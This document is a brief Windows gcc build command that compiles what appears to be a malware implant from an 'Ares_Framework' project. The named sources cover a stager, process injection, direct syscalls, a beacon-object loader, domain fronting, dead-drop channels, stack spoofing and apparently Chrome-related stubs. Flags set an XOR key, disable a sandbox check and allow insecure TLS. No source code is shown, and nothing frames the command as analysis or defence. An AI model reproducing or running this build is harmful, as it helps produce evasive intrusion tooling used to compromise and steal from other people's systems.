cd C:\Users\Admin\.openclaw\workspace\Ares_Framework

gcc -Wall -O0 -g -fno-ident -mconsole ^
    -Wno-format-truncation -Wno-stringop-truncation -Wno-unused-variable -Wno-unused-function ^
    -Wno-unused-but-set-variable -Wno-cpp -Wno-unknown-pragmas -Wno-format -Wno-incompatible-pointer-types ^
    -DCFG_XOR_KEY=0x5A -DCFG_SANDBOX_CHECK=0 -DCFG_TLS_INSECURE=1 -DARES_DEBUG=1 -I. ^
    -o build\ares_debug.exe ^
    agent\native\stager.c agent\native\core.c agent\native\syscall.c agent\native\inject.c ^
    agent\native\bof_loader.c agent\native\domain_front.c agent\native\dead_drop.c ^
    agent\native\cap_loader.c agent\native\stack_spoof.c agent\native\chrome_stubs.c ^
    build\resources.o ^
    -lkernel32 -luser32 -lws2_32 -lgdi32 -luuid
